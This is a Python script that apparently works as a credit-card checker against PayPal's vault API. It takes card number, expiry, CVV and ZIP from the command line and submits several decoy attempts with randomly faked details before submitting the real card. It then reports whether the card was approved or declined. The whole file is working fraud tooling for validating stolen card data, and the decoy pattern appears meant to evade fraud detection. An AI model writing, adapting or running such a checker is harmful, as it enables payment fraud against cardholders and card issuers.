#!/usr/bin/env python3
import base64
import time
import requests

from _common import cli_args, parse_cc, fake_creds, emit, log

CLIENT_ID = "YOUR_PAYPAL_CLIENT_ID"
SECRET = "YOUR_PAYPAL_SECRET"
SANDBOX = True
BASE = "https://api-m.sandbox.paypal.com" if SANDBOX else "https://api-m.paypal.com"


def get_token():
    auth = base64.b64encode(f"{CLIENT_ID}:{SECRET}".encode()).decode()
    try:
        r = requests.post(
            f"{BASE}/v1/oauth2/token",
            headers={"Authorization": f"Basic {auth}", "Content-Type": "application/x-www-form-urlencoded"},
            data={"grant_type": "client_credentials"},
            timeout=12,
        )
        return r.json().get("access_token", "")
    except Exception as e:
        log(f"[paypal] token error: {e}")
        return ""


def attempt(token, number, mm, yy, cvv, zip_code):
    try:
        r = requests.post(
            f"{BASE}/v1/vault/credit-cards",
            headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
            json={
                "number": number, "type": "visa",
                "expire_month": int(mm), "expire_year": int("20" + yy),
                "cvv2": cvv, "first_name": "Test", "last_name": "User",
                "billing_address": {"line1": "1 Main St", "city": "San Jose", "state": "CA", "postal_code": zip_code, "country_code": "US"},
            },
            timeout=12,
        )
        j = r.json()
        if r.status_code in (200, 201) and "id" in j:
            return "approved", j.get("id", "")
        if "error" in j or "name" in j:
            return "declined", (j.get("message") or j.get("name") or "")[:200]
        return "error", str(j)[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def main():
    args = cli_args()
    cc = parse_cc(args.cc)
    if not cc:
        return emit("paypal", "error", 0, 0, "bad cc format")
    token = get_token()
    if not token:
        return emit("paypal", "error", 0, 0, "token fetch failed")
    start = time.time()
    n = 0
    for _ in range(args.rounds):
        f = fake_creds(cc)
        s, _ = attempt(token, cc["number"], f["mm"], f["yy"], f["cvv"], f["zip"])
        n += 1
        log(f"[paypal] fake #{n}: {s}")
    status, raw = attempt(token, cc["number"], cc["mm"], cc["yy"], cc["cvv"], args.zip)
    n += 1
    log(f"[paypal] real #{n}: {status} {raw}")
    emit("paypal", status, n, time.time() - start, raw)


if __name__ == "__main__":
    main()
